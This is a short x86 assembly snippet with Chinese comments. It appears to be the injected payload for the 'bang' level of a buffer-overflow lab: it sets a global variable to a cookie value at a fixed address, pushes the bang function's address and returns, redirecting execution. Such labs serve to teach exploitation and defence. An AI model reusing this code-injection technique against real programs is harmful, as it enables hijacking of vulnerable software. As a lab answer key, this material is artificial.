# 改变 global_value
movl $0x20ca71d4, 0x804d100
# 将 bang 函数的首地址压入栈
pushl $0x8048bc5
ret
